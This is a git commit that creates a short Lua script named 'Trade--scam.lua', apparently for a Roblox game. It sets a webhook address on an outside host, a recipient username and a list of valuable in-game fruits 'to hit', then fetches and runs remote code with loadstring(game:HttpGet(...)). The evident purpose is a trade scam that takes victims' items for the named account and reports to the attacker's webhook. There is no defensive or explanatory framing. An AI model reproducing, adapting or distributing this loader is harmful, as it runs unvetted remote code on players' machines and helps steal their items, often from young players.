eb8501e56c096d328d4654677392f514f2a6d104
Trace-Seeker163 <maind9704@gmail.com>
2025-03-22 10:05:43 +0200

    Create Trade--scam.lua

---
+++ Trade--scam.lua
@@ -0,0 +1,5 @@
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=RnlGUExRbnFJVWJMMGJuMTl5VktLUTpoeFlQRUw4T1ZJMU1iQzhPRExaM0xQc2RjcFlpcVByRk0ycUp2MEctNWYzRlQ4NEN2TWN5OEtQOUZuZkhhLU5rSkRlajJPaUVUZGJiOERUSUctclhRRUdoT0hHZHFsUy1SU0lhNW5YZWtlejdhclZaWGRXNUR6V3pZaFhqdXZlT0ROYVdyQ3pSNEM3dWhxaHktQU1rQXFXc3daUDhDY291NGNHMklmNzBlUUE"
+Usernames = {"ToxicVortex0"}
+FruitsToHit = {"Buddha-Buddha", "Portal-Portal", "Rumble-Rumble", "Blizzard-Blizzard", "Mammoth-Mammoth", "Gravity-Gravity", "T-Rex-T-Rex", "Dough-Dough", "Shadow-Shadow", "Venom-Venom", "Control-Control", "Gas-Gas", "Leopard-Leopard", "Spirit-Spirit", "Yeti-Yeti", "Kitsune-Kitsune", "Sound-Sound", "Quake-Quake"}
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
